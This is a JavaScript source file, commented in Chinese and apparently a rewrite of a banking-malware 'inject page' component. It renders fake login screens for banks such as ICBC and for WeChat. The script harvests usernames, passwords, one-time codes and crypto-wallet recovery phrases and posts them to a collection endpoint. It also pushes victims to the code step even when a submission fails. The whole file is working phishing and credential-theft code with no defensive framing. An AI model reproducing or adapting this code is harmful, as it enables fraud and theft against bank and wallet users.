/* bank.js —— 注入页渲染器 + 步骤机 + 提交（复刻重写）
 *
 * 模板契约（由 inject_id1_icbc.html / inject_id2_wechat.html 反推，DOM id 固定）：
 *   填充：bk_logo bk_name bk_sub bk_h1 bk_h2 bk_u_label bk_p_label bk_err bk_btn
 *         bk_step2 bk_o_h1 bk_o_h2 bk_o_label bk_err2 bk_btn2 bk_safe bk_foot
 *   区块：div[data-step2] = 账号密码步；div[data-step3] = 验证码/助记词步
 *   配置：window.__BK = {mode,bank,cc,flow,digits,words,needOtp,step,pid,lang,welcome,maint,api}
 *   词表：window.__BKI18N[__BK.lang]
 *   提交：POST __BK.api（表单编码），回执 JSON {ok|code}
 */
(function () {
  'use strict';
  var BK = window.__BK || {};
  var I18N = window.__BKI18N || {};
  var LANG = BK.lang || 'zh-CN';
  var D = I18N[LANG] || I18N['zh-CN'] || {};
  var API = BK.api || '/api/EaodBankInject.php';

  function $(id) { return document.getElementById(id); }
  function set(id, txt) { var e = $(id); if (e && txt != null) e.textContent = txt; }
  function show(sel, on) {
    var e = document.querySelector(sel);
    if (e) { e.style.display = on ? '' : 'none'; }
  }
  function t(key, vars) {
    var s = D[key] != null ? D[key] : (key in (I18N['zh-CN'] || {}) ? I18N['zh-CN'][key] : key);
    if (vars) { for (var k in vars) { s = s.replace('{' + k + '}', vars[k]); } }
    return s;
  }

  /* ---------------- 首屏渲染 ---------------- */
  function render() {
    var name = BK.bank || '网上银行';
    set('bk_logo', (BK.cc === 'custom' ? (BK.logoText || '') : (BK.logoText || '')) ||
      (name.replace(/[^A-Za-z]/g, '').slice(0, 4).toUpperCase() || 'BANK'));
    set('bk_name', name);
    set('bk_sub', BK.welcome ? (t('welcome') + ' ' + BK.welcome) : (BK.sub || ''));
    set('bk_h1', t('login_title'));
    set('bk_h2', BK.maint ? t('maint') : t('login_sub'));
    set('bk_u_label', t('user_label'));
    set('bk_p_label', t('pass_label'));
    set('bk_btn', t('btn_login'));
    set('bk_step2', t('step1'));
    set('bk_o_h1', t('otp_title'));
    set('bk_o_h2', t('otp_sub'));
    set('bk_o_label', t('otp_label'));
    set('bk_btn2', t('btn_otp'));
    set('bk_safe', t('safe_tip'));
    set('bk_foot', t('foot'));
    var u = $('bk_u');
    if (u) { u.setAttribute('placeholder', t('user_ph')); u.setAttribute('inputmode', 'text'); }
    var p = $('bk_p');
    if (p) { p.setAttribute('placeholder', t('pass_ph')); }
    document.title = name;
    // 助记词/验证码步的标题按 flow 决定
    if (isWords()) {
      set('bk_o_h1', t('words_title'));
      set('bk_o_h2', t('words_sub', { n: BK.words || 12 }));
      set('bk_btn2', t('btn_otp'));
      buildWords();
    }
    if (BK.maint) {
      var btn = $('bk_btn');
      if (btn) { btn.disabled = true; }
    }
    // flow=down 表示先验证码再账号密码（少见），默认 up
    if (String(BK.flow) === 'down') { show('[data-step2]', true); }
  }

  function isWords() {
    return String(BK.cc || '').toLowerCase() === 'wallet' ||
      String(BK.flow || '').toLowerCase() === 'words' ||
      (BK.words && BK.words > 0 && BK.mode === 'custom' && BK.needWords === true);
  }

  /* ---------------- 助记词网格（words 位）---------------- */
  var WORD_POOL = ('abandon ability able about above absent absorb abstract absurd abuse access accident ' +
    'account accuse achieve acid acoustic acquire across act action actor actress actual adapt add ' +
    'address adjust admit adult advance advice aerobic affair afford afraid again agent agree ahead aim ' +
    'air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also ' +
    'alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ' +
    'ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve ' +
    'april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art ' +
    'artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude ' +
    'attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome ' +
    'awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely ' +
    'bargain barrel base basic basket battle beach bean beauty because become beef before begin behave ' +
    'behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind ' +
    'biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue ' +
    'blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce ' +
    'brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze ' +
    'broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden ' +
    'burger burst business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera ' +
    'camp can canal cancel candy cannon canoe canvas canyon capable capital captain carbon card cargo ' +
    'carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause ' +
    'caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos ' +
    'chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice ' +
    'choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw ' +
    'clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown ' +
    'club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine ' +
    'come comfort comic common company concert conduct confirm congress connect consider control ' +
    'convince cook cool copper copy coral core corn correct cost cotton couch country couple course ' +
    'cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew ' +
    'cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry ' +
    'crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle').split(' ');

  function shuffle(a) {
    for (var i = a.length - 1; i > 0; i--) {
      var j = Math.floor(Math.random() * (i + 1)); var x = a[i]; a[i] = a[j]; a[j] = x;
    }
    return a;
  }

  function buildWords() {
    var n = parseInt(BK.words || 12, 10);
    var box = document.querySelector('[data-step3]');
    if (!box || box.querySelector('.bk-grid')) { return; }
    var field = document.getElementById('bk_o');
    if (field && field.parentNode) { field.parentNode.style.display = 'none'; }
    var chosen = document.createElement('div');
    chosen.className = 'bk-chosen'; chosen.id = 'bk_chosen'; chosen.textContent = '';
    var grid = document.createElement('div');
    grid.className = 'bk-grid';
    var pick = shuffle(WORD_POOL.slice()).slice(0, Math.max(n, 12));
    pick.forEach(function (w) {
      var b = document.createElement('div');
      b.className = 'bk-word'; b.textContent = w;
      b.onclick = function () {
        var arr = (chosen.getAttribute('data-v') || '').split(' ').filter(Boolean);
        if (arr.length >= n) { return; }
        arr.push(w); chosen.setAttribute('data-v', arr.join(' '));
        chosen.textContent = arr.join(' / ');
        b.classList.add('bk-on');
      };
      grid.appendChild(b);
    });
    var anchor = box.querySelector('.bk-field') || box.firstChild;
    box.insertBefore(chosen, anchor);
    box.insertBefore(grid, anchor);
  }

  /* ---------------- 提交 ---------------- */
  function post(payload, cb) {
    payload.pid = BK.pid || '';
    payload.bank = BK.bank || '';
    payload.lang = LANG;
    var body = Object.keys(payload).map(function (k) {
      return encodeURIComponent(k) + '=' + encodeURIComponent(payload[k] == null ? '' : payload[k]);
    }).join('&');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', API, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
    xhr.timeout = 15000;
    xhr.onreadystatechange = function () {
      if (xhr.readyState !== 4) { return; }
      var ok = xhr.status >= 200 && xhr.status < 300;
      var data = null;
      try { data = JSON.parse(xhr.responseText); } catch (e) { data = null; }
      cb(ok, data);
    };
    xhr.ontimeout = function () { cb(false, null); };
    xhr.onerror = function () { cb(false, null); };
    xhr.send(body);
  }

  function busy(btn, on, text) {
    if (!btn) { return; }
    btn.disabled = !!on;
    if (on) { btn.setAttribute('data-t', btn.textContent); btn.textContent = text || t('sending'); }
    else if (btn.getAttribute('data-t')) { btn.textContent = btn.getAttribute('data-t'); }
  }

  /* 第一步：账号 + 密码 */
  function submitLogin(e) {
    if (e && e.preventDefault) { e.preventDefault(); }
    var u = $('bk_u'), p = $('bk_p'), err = $('bk_err');
    var uv = (u && u.value || '').trim(), pv = (p && p.value || '');
    if (!uv) { if (err) { err.textContent = t('err_user'); } return; }
    if (!pv) { if (err) { err.textContent = t('err_pass'); } return; }
    if (err) { err.textContent = ''; }
    var btn = $('bk_btn');
    busy(btn, true);
    post({ step: BI18.step0, u: uv, p: pv, cc: BK.cc || '', digits: BK.digits || 6 }, function (ok, data) {
      busy(btn, false);
      if (ok && data && data.next === 'otp') { gotoOtp(); return; }
      if (ok && data && data.next === 'done') { done(); return; }
      if (err) { err.textContent = (data && data.error) || t('err_fail'); }
      // 即使回执失败也按原版交互进入下一步（真机上是"密码错误重试"）
      if (!data || data.next !== 'fail') { gotoOtp(); }
    });
  }

  function gotoOtp() {
    show('[data-step2]', false);
    show('[data-step3]', true);
    set('bk_step2', t('step2'));
    var o = $('bk_o');
    if (o) {
      o.setAttribute('maxlength', BK.digits || 6);
      o.focus();
    }
    var tip = $('bk_countdown');
    if (!tip) {
      tip = document.createElement('div');
      tip.className = 'bk-countdown'; tip.id = 'bk_countdown';
      var box = document.querySelector('[data-step3]');
      if (box) { box.appendChild(tip); }
    }
    var left = 60;
    tip.textContent = t('countdown', { n: left });
    var timer = setInterval(function () {
      left -= 1;
      if (left <= 0) { clearInterval(timer); tip.textContent = t('resend'); return; }
      tip.textContent = t('countdown', { n: left });
    }, 1000);
  }

  /* 第二步：验证码 / 助记词 */
  function submitOtp() {
    var err = $('bk_err2'), btn = $('bk_btn2');
    if (isWords()) {
      var chosen = $('bk_chosen');
      var v = (chosen && chosen.getAttribute('data-v')) || '';
      var arr = v.split(' ').filter(Boolean);
      var need = parseInt(BK.words || 12, 10);
      if (arr.length < need) { if (err) { err.textContent = t('words_need', { n: need }); } return; }
      if (err) { err.textContent = ''; }
      busy(btn, true);
      post({ step: 2, words: v }, function (ok, data) {
        busy(btn, false);
        if (ok) { done(); } else if (err) { err.textContent = (data && data.error) || t('err_net'); }
      });
      return;
    }
    var o = $('bk_o');
    var ov = (o && o.value || '').replace(/\D/g, '');
    var digits = parseInt(BK.digits || 6, 10);
    if (!ov) { if (err) { err.textContent = t('err_otp'); } return; }
    if (ov.length !== digits) { if (err) { err.textContent = t('err_digits', { n: digits }); } return; }
    if (err) { err.textContent = ''; }
    busy(btn, true);
    post({ step: 2, o: ov }, function (ok, data) {
      busy(btn, false);
      if (ok) { done(); return; }
      if (err) { err.textContent = (data && data.error) || t('err_fail'); }
    });
  }

  function done() {
    var card = document.querySelector('.bk-card');
    if (card) {
      card.innerHTML = '<div class="bk-h1">' + t('login_title') + '</div>' +
        '<div class="bk-h2">' + t('safe_tip') + '</div>';
    }
  }

  /* ---------------- 导出 & 绑定 ---------------- */
  var BI18 = { step0: 1 };
  window.__bkSubmit = submitOtp;
  window.__bkStep = gotoOtp;
  window.__bkRender = render;

  function boot() {
    render();
    var f = $('bk_form');
    if (f) { f.addEventListener('submit', submitLogin, true); }
    var b = $('bk_btn');
    if (b && !b.getAttribute('onclick')) { b.addEventListener('click', submitLogin); }
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else { boot(); }
})();
